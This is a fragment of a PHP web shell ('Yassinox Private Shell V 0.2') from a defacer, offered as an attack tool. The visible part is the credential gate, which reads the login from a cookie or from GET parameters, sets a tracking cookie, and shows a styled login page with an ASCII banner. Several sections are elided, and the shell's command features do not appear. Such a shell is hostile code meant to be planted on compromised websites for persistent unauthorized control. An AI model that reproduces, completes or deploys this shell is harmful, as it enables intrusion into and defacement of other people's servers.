<?php 
// username Is yassinox password is Defacer Change Them Below
//-------------[ Config ]-------------\\
$username = "your pass here";
$password = "your pass here";
//-------------[ Config ]-------------\\
    if ($_COOKIE['login'] != $username.":".$password) {
	if(!isset($_SESSION['log'])){ 
			if(!isset($_GET['username']) or empty($_GET['username']) or !isset($_GET['password']) or empty($_GET['password'])){ 
            if (!isset($_COOKIE["qsdqfsdfsdsdzeaze"])) {
			echo <<<loginform
<!-- Login Form -->
<title>Yassinox Private Shell</title>
<!--
Yassinox_Tn Private SHell V 0.2
Bypass Many Functions
 
 
__   __            _                 _____    
\ \ / /           (_)               |_   _|    
 \ V /__ _ ___ ___ _ _ __   _____  __ | |_ __  
  \ // _` / __/ __| | '_ \ / _ \ \/ / | | '_ \
  | | (_| \__ \__ \ | | | | (_) >  <  | | | | |
  \_/\__,_|___/___/_|_| |_|\___/_/\_\ \_/_| |_|
                                  ______      
                                 |______|      
-->
<style>
...
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="http://www11.0zz0.com/2014/08/23/06/983187840.png">
  <div class="inset">
  <p>
...
<center><img src="http://www.businesszone.co.uk/files/siftmedia-businesszone/images/BANNED-logo.png"></center>';
}
exit();
			}else{ 
				if($_GET['username'] == $username and $_GET['password'] == $password ){ 
                  ...
                  setcookie("qsdqfsdfsdsdzeaze", "khqsdgbqjshqsqsdqssdfs");
